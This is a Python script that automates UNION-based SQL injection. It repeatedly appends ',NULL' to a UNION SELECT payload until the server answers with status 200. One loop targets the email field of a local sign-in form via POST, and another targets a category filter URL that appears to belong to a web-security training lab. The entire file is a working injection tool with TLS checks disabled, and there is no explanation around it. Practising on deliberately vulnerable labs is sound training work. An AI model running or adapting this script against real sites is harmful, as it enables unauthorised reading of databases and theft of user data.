import os
import sys
import warnings
from requests import Session

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) '\
                         'AppleWebKit/537.36 (KHTML, like Gecko) '\
                         'Chrome/75.0.3770.80 Safari/537.36'}

s = Session()
s.headers.update(headers)
st0 = True
st1 = True
#This for Post
def sendreq(url,data):
    global st0
    x = s.post(url, verify=False ,timeout=4,data=data)
    print(str(x.status_code)+" "+str(url))
    if x.status_code == 200 :
        print(data)
        st0 = False
        
#This for Post
def hay():
    val =',NULL+'
    quecpy=data.get('email')
    rmquecpy = quecpy.replace("--","")
    cpques = rmquecpy+val
    return cpques

#This for Get
def sendget(gurl):
    global st1
    y = s.get(gurl,verify=False,timeout=5)
    print(str(y.status_code)+" "+str(gurl))
    if y.status_code == 200:
        st1 =False
    return gurl
    
#This for GET  
def baan():
    kurl = "https://acd81f2b1fcdf7ddc05f25c700a70010.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL"
    jka=',NULL+' 
    coms='--'   
    gurl =kurl+jka+coms
    res = sendget(gurl)
    while st1 ==True :
        rpres = res.replace("--","")
        vds = rpres+jka+coms
        res = sendget(vds)

    
    
#Post Url    
url = 'http://127.0.0.1:8081/Authentication/signin'

#Post Data
data = {"email":"9876543210'+UNION+SELECT+NULL",
        "password":"123456",
        "login":"Login"}
        



try:
    #this for post
    while st0==True:
        a = hay()
        com='--'
        data['email']=a+com
        sendreq(url,data)
except:
    #this for get
    while st1== True:
        baan()


